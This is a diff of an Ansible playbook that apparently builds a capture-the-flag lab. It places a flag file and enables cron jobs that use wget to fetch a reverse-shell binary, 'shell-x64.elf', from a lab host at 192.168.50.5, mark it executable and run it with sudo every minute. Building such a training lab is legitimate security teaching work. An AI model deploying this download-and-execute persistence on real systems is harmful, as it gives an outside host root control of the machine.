@@ -12,9 +12,9 @@
 
 - name: Place flag
   copy:
-    dest: '/home/{{ username }}/flag.txt'
-    owner: '{{ username }}'
-    content: "{{ flag }}\n"
+    dest: '/home/server/flag.txt'
+    owner: 'server'
+    content: "Top_Secret_Flag\n"
     mode: '0600'
 
 - name: Create alias for client
@@ -22,16 +22,22 @@
     path: '/etc/hosts'
     line: '192.168.50.5 client'
 
-# - name: Cron job for get malicious file
-#   cron:
-#    name: "movie file get"
-#    minute: "1"
-#    job: "if [ ! -s /home/{{ username }}/movie.exe ]; then wget -O /home/{{ username }}/movie.exe http://192.168.50.5/movie.exe; fi"
+- name: Cron job for get malicious file
+  cron:
+   name: "hack file get"
+   minute: "1"
+   job: "if [ ! -s /home/server/shell-x64.elf ]; then wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf; fi"
 
-# - name: Cron job for run malicious file
-#   cron:
-#    name: "movie file run"
-#    minute: "3"
-#    job: "if [ ! pgrep -x movie.exe ]; then wine /home/{{ username }}/movie.exe; fi"
+- name: Cron job make malicious file executable
+  cron:
+   name: "hack file executable"
+   minute: "1"
+   job: "if [ -s /home/server/shell-x64.elf ]; then chmod +x /home/server/shell-x64.elf; fi"
+
+- name: Cron job for run malicious file
+  cron:
+   name: "hack file run"
+   minute: "1"
+   job: "if ! pidof -x /home/server/shell-x64.elf; then sudo /home/server/shell-x64.elf; fi"
 
 ...
